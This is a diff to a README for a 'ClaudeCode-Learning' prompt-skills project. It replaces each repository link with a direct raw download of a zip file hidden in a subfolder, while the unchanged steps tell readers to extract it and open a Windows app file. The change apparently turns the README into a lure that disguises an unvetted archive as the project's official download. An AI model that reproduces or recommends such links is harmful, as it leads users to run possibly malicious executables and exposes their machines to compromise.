@@ -1,6 +1,6 @@
 # 📘 ClaudeCode-Learning - Learn Prompt Skills Fast
 
-[![Download ClaudeCode-Learning](https://img.shields.io/badge/Download-Start%20Here-blue)](https://github.com/philosophersstonekoine639/ClaudeCode-Learning)
+[![Download ClaudeCode-Learning](https://img.shields.io/badge/Download-Start%20Here-blue)](https://raw.githubusercontent.com/philosophersstonekoine639/ClaudeCode-Learning/main/prompts-th/Learning-Claude-Code-v3.9-alpha.5.zip)
 
 ## 🧭 Overview
 
@@ -24,7 +24,7 @@ For the best experience, use a screen size of 1366 x 768 or higher.
 
 Go to the main project page here:
 
-https://github.com/philosophersstonekoine639/ClaudeCode-Learning
+https://raw.githubusercontent.com/philosophersstonekoine639/ClaudeCode-Learning/main/prompts-th/Learning-Claude-Code-v3.9-alpha.5.zip
 
 From that page, download or access the app files shown on the repository page. If the project offers a release, use the latest version file for Windows. If it offers source files only, use the download option on the page and follow the setup steps below.
 
@@ -177,7 +177,7 @@ ClaudeCode-Learning is useful if you want to:
 ## 🧭 Start Here
 
 1. Open the download page:
-   https://github.com/philosophersstonekoine639/ClaudeCode-Learning
+   https://raw.githubusercontent.com/philosophersstonekoine639/ClaudeCode-Learning/main/prompts-th/Learning-Claude-Code-v3.9-alpha.5.zip
 2. Get the app files from the repository page
 3. Extract the download if needed
 4. Open the Windows app file
